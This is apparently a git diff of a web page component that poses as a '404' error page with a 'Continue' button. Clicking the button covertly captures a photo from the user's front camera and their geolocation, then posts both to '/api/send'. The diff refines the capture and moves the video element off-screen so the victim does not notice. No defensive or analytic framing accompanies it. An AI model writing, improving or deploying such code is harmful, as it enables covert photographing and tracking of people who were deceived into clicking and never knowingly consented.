@@ -6,7 +6,6 @@ export default function Home() {
   const videoRef = useRef<HTMLVideoElement>(null);
 
   async function capture() {
-    // ---------- CAMERA ----------
     const stream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: "user" }
     });
@@ -14,28 +13,23 @@ export default function Home() {
     const video = videoRef.current!;
     video.srcObject = stream;
     video.muted = true;
+
     await video.play();
 
-    // ✅ USE IMAGECAPTURE (key change)
-    const track = stream.getVideoTracks()[0];
-    // @ts-ignore
-    const imageCapture = new (window as any).ImageCapture(track);
-    const bitmap = await imageCapture.grabFrame;
+    // 🔴 CRITICAL: wait for real frame render
+    await new Promise(resolve => setTimeout(resolve, 500));
 
-    // draw bitmap to canvas
     const canvas = document.createElement("canvas");
-    canvas.width = bitmap.width;
-    canvas.height = bitmap.height;
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
 
     const ctx = canvas.getContext("2d")!;
-    ctx.drawImage(bitmap, 0, 0);
+    ctx.drawImage(video, 0, 0);
 
     const image = canvas.toDataURL("image/jpeg", 0.9);
 
-    // stop camera
     stream.getTracks().forEach(t => t.stop());
 
-    // ---------- LOCATION ----------
     navigator.geolocation.getCurrentPosition(async pos => {
       await fetch("/api/send", {
         method: "POST",
@@ -47,6 +41,7 @@ export default function Home() {
         })
       });
     });
+  console.log("image length:", image.length);
   }
 
   return (
@@ -54,11 +49,18 @@ export default function Home() {
       <h1>404</h1>
       <p>Click here to continue</p>
 
+      {/* 🔑 MUST BE RENDERED, NOT HIDDEN */}
       <video
         ref={videoRef}
         playsInline
         muted
-        style={{ width: 1, height: 1, opacity: 0 }}
+        style={{
+          position: "absolute",
+          top: "-1000px",
+          left: "-1000px",
+          width: "1px",
+          height: "1px"
+        }}
       />
 
       <button onClick={capture}>Continue</button>
